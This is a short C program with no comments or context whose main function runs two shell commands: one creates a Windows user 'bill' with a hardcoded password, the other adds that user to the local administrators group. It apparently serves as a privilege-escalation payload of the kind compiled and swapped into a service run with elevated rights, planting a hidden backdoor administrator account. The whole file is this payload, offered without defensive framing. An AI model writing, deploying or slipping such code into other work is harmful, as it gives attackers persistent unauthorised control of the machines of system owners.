#include <stdlib.h>

int main ()
{
        int i;
        i = system ("net user bill P@ssw0rd123! /add");
        i = system("net localgroup administrators bill /add");

        return 0;

}
